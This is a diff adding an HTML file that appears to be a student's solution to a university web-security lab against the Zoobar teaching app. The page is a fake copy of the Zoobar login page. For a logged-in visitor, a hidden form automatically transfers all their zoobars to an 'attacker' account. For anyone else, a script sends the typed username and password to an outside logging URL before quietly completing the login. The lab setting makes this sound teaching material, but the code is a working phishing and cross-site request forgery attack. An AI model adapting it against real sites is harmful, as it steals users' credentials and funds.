@@ -1,0 +1,79 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
+        <title>
+            Login - Zoobar Foundation
+        </title>
+    </head>
+    <body>
+        <h1><a href="">Zoobar Foundation for Ethical Discourse</a></h1>
+        <h2>Supporting the best researchers of the 21st-century</h2>
+        <div id="myZoobars" style="display: none;">-1</div>
+        <script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
+        <div id="login" class="centerpiece">
+            <!-- to prevent form from redirecting to zoobar webpage after submission -->
+            <iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
+            <form target="dummyframe" method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" style="display: none;">
+                <input name="zoobars" type="text" value="" size=5>
+                <input name="recipient" type="text" value="attacker" size=10>
+                <input type="hidden" name="submission" value="Send">
+            </form>
+            <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
+                <table>
+                    <tr>
+                        <td>Username:</td>
+                        <td>
+                            <input type="text" name="login_username" size="20" autocomplete="no" value="">
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>Password:</td>
+                        <td colspan=2>
+                            <input type="password" name="login_password" size=20 autocomplete="no">
+                            <input onclick="document.loginform.req_type='login';" type="submit" name="submit_login" value="Log in">
+                            <input onclick="document.loginform.req_type='register';" type="submit" name="submit_registration" value="Register">
+                        </td>
+                    </tr>
+                </table>
+                <input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
+            </form>
+        </div>
+        <div class="footer warning"></div>
+        <script>document.loginform.login_username.focus();</script>
+        <script>
+            // check if user is logged in
+            const zoobarCount = parseInt(document.getElementById("myZoobars").innerHTML);
+            if (zoobarCount >= 0) {
+                // user is logged in: steal zoobars
+                const form = document.transferform;
+                form.zoobars.setAttribute("value", zoobarCount);
+                form.submit();
+
+                setTimeout(function() {
+                    document.location.href = "https://css.csail.mit.edu/6.858/2022/";
+                }, 2000);
+                // http://localhost:8080/zoobar/index.cgi
+            } else {
+                // user is NOT logged in: same behavior as in exercise 12
+                const form = document.loginform;
+                function onSubmit(event) {
+                    event.preventDefault();
+                    var key = event.target.login_username.value + "/" + event.target.login_password.value;
+                    (new Image()).src="https://css.csail.mit.edu/6.858/2022/labs/log.php?id=domhasluck&payload=" + encodeURIComponent(key) + "&random=" + Math.random();
+                    setTimeout(function() {
+                        if (form.req_type == "login") {
+                            form.submit_login.setAttribute("type", "hidden");
+                        } else {
+                            form.submit_registration.setAttribute("type", "hidden");
+                        }
+                        form.submit();
+                    }, 2000);
+                }
+                form.addEventListener("submit", onSubmit);
+            } 
+        </script>
+    </body>
+</html>
